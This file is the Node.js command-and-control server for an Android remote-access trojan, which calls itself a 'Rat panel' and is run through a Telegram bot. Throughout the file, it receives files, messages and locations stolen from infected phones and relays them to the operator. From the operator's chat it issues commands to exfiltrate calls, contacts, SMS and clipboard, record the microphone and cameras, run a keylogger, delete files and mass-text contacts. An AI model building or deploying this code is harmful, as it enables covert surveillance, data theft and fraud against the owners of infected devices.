const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const token = process.env.bot_token;
const id = process.env.bot_id;
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });

const appClients = new Map();
const userSessions = new Map();

const upload = multer({ dest: 'uploadedFile/' });
if (!fs.existsSync('uploadedFile')) {
    fs.mkdirSync('uploadedFile');
}

app.use(bodyParser.json());

function sendCommandToDevice(uuid, command, chatId, messageId = null) {
    let sent = false;
    appSocket.clients.forEach(ws => {
        if (ws.uuid === uuid) {
            ws.send(command);
            sent = true;
        }
    });
    if (messageId) {
        appBot.deleteMessage(chatId, messageId).catch(() => {});
    }
    appBot.sendMessage(
        chatId,
        sent
            ? '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨...'
            : '°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙!'
    );
}

function startUserInputProcess(chatId, uuid, promptText, nextStepHandler) {
    const session = userSessions.get(chatId);
    if (session) {
        session.currentUuid = uuid;
        session.nextStep = nextStepHandler;
    }
    appBot.sendMessage(chatId, promptText, { reply_markup: { force_reply: true } });
}

app.get('/', (req, res) => {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙮</h1>');
});

// ================================================
// تعديل مسار رفع الملفات: إرسال الملف مباشرة إلى التليجرام بدلاً من رابط
// ================================================
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const originalName = req.file.originalname;
    const tempPath = req.file.path;
    const safeName = encodeURIComponent(originalName);
    const finalPath = path.join(__dirname, 'uploadedFile', safeName);

    fs.rename(tempPath, finalPath, (err) => {
        if (err) {
            console.error('Error renaming file:', err);
            return res.status(500).send('');
        }

        // إرسال الملف كـ document إلى التليجرام
        appBot.sendDocument(
            id,
            finalPath,
            {
                caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
                parse_mode: 'HTML'
            }
        ).catch(e => console.error('Telegram send error:', e));

        res.send('');
    });
});

// ================================================
// إزالة مسارات getFile و deleteFile لأننا لم نعد نحتاجها
// (يمكنك إبقاؤها إذا أردت ولكن لن تُستخدم)
// ================================================

app.post('/uploadText', (req, res) => {
    appBot.sendMessage(
        id,
        `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n${req.body.text}`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨'], ['𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙']],
                resize_keyboard: true,
            },
            disable_web_page_preview: true,
        }
    );
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(
        id,
        `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨'], ['𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙']],
                resize_keyboard: true,
            },
        }
    );
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const { model, battery, version, brightness, provider } = req.headers;

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });

    appBot.sendMessage(
        id,
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        { parse_mode: 'HTML' }
    );

    ws.on('close', () => {
        appBot.sendMessage(
            id,
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
                `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
                `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            { parse_mode: 'HTML' }
        );
        appClients.delete(uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;

    if (chatId != id) {
        appBot.sendMessage(chatId, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙');
        return;
    }

    if (!userSessions.has(chatId)) {
        userSessions.set(chatId, { currentUuid: '', currentNumber: '', currentTitle: '', nextStep: null });
    }
    const session = userSessions.get(chatId);

    if (message.reply_to_message && session.nextStep) {
        session.nextStep(message, session);
        return;
    }

    if (message.text === '/start') {
        appBot.sendMessage(
            id,
            '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @shivayadavv / @hackdagger & https://github.com/Did-Dog',
            {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                reply_markup: {
                    keyboard: [['𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨'], ['𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙']],
                    resize_keyboard: true,
                },
            }
        );
    } else if (message.text === '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size === 0) {
            appBot.sendMessage(id, '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚');
        } else {
            let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n';
            appClients.forEach((value, key) => {
                text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                    `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: 'HTML' });
        }
    } else if (message.text === '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        if (appClients.size === 0) {
            appBot.sendMessage(id, '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚');
        } else {
            const deviceListKeyboard = [];
            appClients.forEach((value, key) => {
                deviceListKeyboard.push([{ text: value.model, callback_data: `device:${key}` }]);
            });
            appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙', {
                reply_markup: { inline_keyboard: deviceListKeyboard },
            });
        }
    }
});

appBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (chatId != id) {
        appBot.answerCallbackQuery(callbackQuery.id, { text: 'Unauthorized!' });
        return;
    }

    const data = callbackQuery.data;
    const [command, ...params] = data.split(':');
    const uuid = params[0];

    if (!userSessions.has(chatId)) {
        userSessions.set(chatId, { currentUuid: '', currentNumber: '', currentTitle: '', nextStep: null });
    }
    const session = userSessions.get(chatId);

    const inputCommands = [
        'send_message',
        'send_message_to_all',
        'open_target_link',
        'text_to_speech',
        'file',
        'delete_file',
        'microphone',
        'rec_camera_selfie',
        'rec_camera_main',
        'toast',
        'show_notification',
        'play_audio',
    ];

    const immediateCommands = [
        'calls',
        'contacts',
        'messages',
        'apps',
        'device_info',
        'clipboard',
        'camera_main',
        'camera_selfie',
        'location',
        'vibrate',
        'stop_audio',
        'torch_on',
        'torch_off',
        'keylogger_on',
        'keylogger_off',
        'screenshot',
    ];

    if (command === 'device') {
        const deviceInfo = appClients.get(uuid);
        if (!deviceInfo) {
            appBot.answerCallbackQuery(callbackQuery.id, { text: 'Device disconnected!' });
            return;
        }
        appBot.editMessageText(
            `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${deviceInfo.model}</b>`,
            {
                chat_id: chatId,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}` },
                            { text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}` },
                        ],
                        [
                            { text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}` },
                            { text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}` },
                        ],
                        [
                            { text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}` },
                            { text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}` },
                            { text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}` },
                        ],
                        [
                            { text: '𝙍𝙚𝙘𝙤𝙧𝙙 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `rec_camera_main:${uuid}` },
                            { text: '𝙍𝙚𝙘𝙤𝙧𝙙 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `rec_camera_selfie:${uuid}` },
                        ],
                        [
                            { text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}` },
                            { text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}` },
                        ],
                        [
                            { text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}` },
                            { text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}` },
                        ],
                        [
                            { text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}` },
                            { text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}` },
                        ],
                        [
                            { text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}` },
                            { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}` },
                        ],
                        [
                            { text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}` },
                            { text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            { text: '🔥', callback_data: `my_fire_emoji:${uuid}` },
                            { text: '𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩', callback_data: `screenshot:${uuid}` },
                        ],
                        [
                            { text: '𝙏𝙤𝙧𝙘𝙝 𝙊𝙣', callback_data: `torch_on:${uuid}` },
                            { text: '𝙏𝙤𝙧𝙘𝙝 𝙊𝙛𝙛', callback_data: `torch_off:${uuid}` },
                        ],
                        [
                            { text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙣', callback_data: `keylogger_on:${uuid}` },
                            { text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙛𝙛', callback_data: `keylogger_off:${uuid}` },
                        ],
                        [
                            { text: '𝙊𝙥𝙚𝙣 𝙏𝙖𝙧𝙜𝙚𝙩 𝙇𝙞𝙣𝙠', callback_data: `open_target_link:${uuid}` },
                            { text: '𝙏𝙚𝙭𝙩 𝙏𝙤 𝙎𝙥𝙚𝙚𝙘𝙝', callback_data: `text_to_speech:${uuid}` },
                        ],
                        [
                            { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `send_message_to_all:${uuid}` },
                        ],
                        [{ text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝘽𝙪𝙩𝙩𝙤𝙣𝙨', callback_data: `device_button:${uuid}` }],
                    ],
                },
                parse_mode: 'HTML',
            }
        );
        return;
    }

    if (inputCommands.includes(command)) {
        appBot.deleteMessage(chatId, msg.message_id).catch(() => {});

        const prompts = {
            send_message: '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎',
            send_message_to_all: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
            open_target_link: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙',
            text_to_speech: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠',
            file: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙',
            delete_file: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚',
            microphone: '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙',
            rec_camera_selfie: '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙',
            rec_camera_main: '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙',
            toast: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚',
            show_notification: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣',
            play_audio: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮',
        };

        if (command === 'send_message') {
            session.currentUuid = uuid;
            session.nextStep = (msg1, sess1) => {
                sess1.currentNumber = msg1.text;
                sess1.nextStep = (msg2, sess2) => {
                    sendCommandToDevice(
                        sess2.currentUuid,
                        `send_message:${sess2.currentNumber}/${msg2.text}`,
                        chatId
                    );
                    sess2.currentNumber = '';
                    sess2.currentUuid = '';
                    sess2.nextStep = null;
                };
                appBot.sendMessage(
                    chatId,
                    '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧',
                    { reply_markup: { force_reply: true } }
                );
            };
            appBot.sendMessage(chatId, prompts.send_message, { reply_markup: { force_reply: true } });
            return;
        }

        const nextStepHandler = (replyMsg, sess) => {
            const userInput = replyMsg.text;
            let commandToSend = '';

            switch (command) {
                case 'send_message_to_all':
                    commandToSend = `send_message_to_all:${userInput}`;
                    break;
                case 'open_target_link':
                    commandToSend = `open_target_link:${userInput}`;
                    break;
                case 'text_to_speech':
                    const ttsLink =
                        'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' +
                        encodeURIComponent(userInput);
                    commandToSend = `text_to_speech:${ttsLink}`;
                    break;
                case 'file':
                    commandToSend = `file:${userInput}`;
                    break;
                case 'delete_file':
                    commandToSend = `delete_file:${userInput}`;
                    break;
                case 'microphone':
                case 'rec_camera_selfie':
                case 'rec_camera_main':
                    commandToSend = `${command}:${userInput}`;
                    break;
                case 'toast':
                    commandToSend = `toast:${userInput}`;
                    break;
                case 'show_notification':
                    sess.currentTitle = userInput;
                    sess.nextStep = (msg2, sess2) => {
                        const link = msg2.text;
                        sendCommandToDevice(
                            sess2.currentUuid,
                            `show_notification:${sess2.currentTitle}/${link}`,
                            chatId
                        );
                        sess2.currentTitle = '';
                        sess2.currentUuid = '';
                        sess2.nextStep = null;
                    };
                    appBot.sendMessage(
                        chatId,
                        '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣',
                        { reply_markup: { force_reply: true } }
                    );
                    return;
                case 'play_audio':
                    commandToSend = `play_audio:${userInput}`;
                    break;
            }

            if (commandToSend) {
                sendCommandToDevice(sess.currentUuid, commandToSend, chatId);
                sess.currentUuid = '';
                sess.nextStep = null;
            }
        };

        startUserInputProcess(chatId, uuid, prompts[command], nextStepHandler);
        return;
    }

    if (immediateCommands.includes(command)) {
        sendCommandToDevice(uuid, command, chatId, msg.message_id);
        return;
    }

    if (command === 'my_fire_emoji') {
        appBot.deleteMessage(chatId, msg.message_id);
        appBot.sendMessage(
            chatId,
            '°• 𝙔𝙤𝙪𝙧 🔥 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨...\n🔥\n🔥🔥\n🔥🔥🔥',
            {
                reply_markup: {
                    keyboard: [['𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨'], ['𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙']],
                    resize_keyboard: true,
                },
            }
        );
    }

    if (command === 'device_button') {
        session.currentUuid = uuid;
        const device = appClients.get(uuid);
        appBot.editMessageText(
            `°• 𝙋𝙧𝙚𝙨𝙨 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${device.model}</b>`,
            {
                chat_id: chatId,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '|||', callback_data: `device_btn_:recent:${uuid}` },
                            { text: '■', callback_data: `device_btn_:home:${uuid}` },
                            { text: '<', callback_data: `device_btn_:back:${uuid}` },
                        ],
                        [
                            { text: 'Vol +', callback_data: `device_btn_:vol_up:${uuid}` },
                            { text: 'Vol -', callback_data: `device_btn_:vol_down:${uuid}` },
                            { text: '⊙', callback_data: `device_btn_:power:${uuid}` },
                        ],
                        [{ text: 'Exit 🔙', callback_data: `device_btn_:exit:${uuid}` }],
                    ],
                },
                parse_mode: 'HTML',
            }
        );
    }

    if (command === 'device_btn_') {
        const btn = params[0];
        const targetUuid = params[1];
        if (btn === 'exit') {
            appBot.deleteMessage(chatId, msg.message_id);
            return;
        }
        const btnCommand = `btn_${btn}`;
        sendCommandToDevice(targetUuid, btnCommand, chatId, msg.message_id);
    }
});

setInterval(() => {
    appSocket.clients.forEach(ws => ws.send('ping'));
    axios
        .get(address)
        .then(() => {})
        .catch(err => console.error('Periodic axios error:', err.message));
}, 5000);

const PORT = process.env.PORT;
if (!PORT) {
    console.warn(
        '⚠️  Warning: PORT environment variable not set. Using default port 8999. Please set PORT in production.'
    );
}
const serverPort = PORT || 8999;

appServer.listen(serverPort, () => {
    console.log(`🚀 Server running on port ${serverPort}`);
});
